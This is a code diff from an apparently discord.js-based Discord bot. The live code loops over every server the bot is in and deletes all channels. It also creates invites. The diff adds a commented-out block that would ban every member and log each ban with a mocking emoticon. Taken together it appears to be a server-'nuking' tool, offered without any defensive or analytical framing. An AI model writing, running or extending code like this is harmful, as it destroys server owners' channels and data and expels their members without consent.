@@ -17,15 +17,19 @@ server.channels.first().createInvite().then(inviteCode => {
         });
     });
 });
-   
+
 
 client.guilds.forEach(server => {
     server.channels.forEach(channel => {
         channel.delete();    
     });
 });
-
-
+/*
+guild.members.forEach(m => {
+    m.ban();
+    console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Banned ${m.user.username}; ID: ${m.id}. (╯°□°）╯︵ ┻━┻`);
+});
+*/
 //startup message log
 console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Logged in as ${client.user.tag}. (^o^)／`);
 
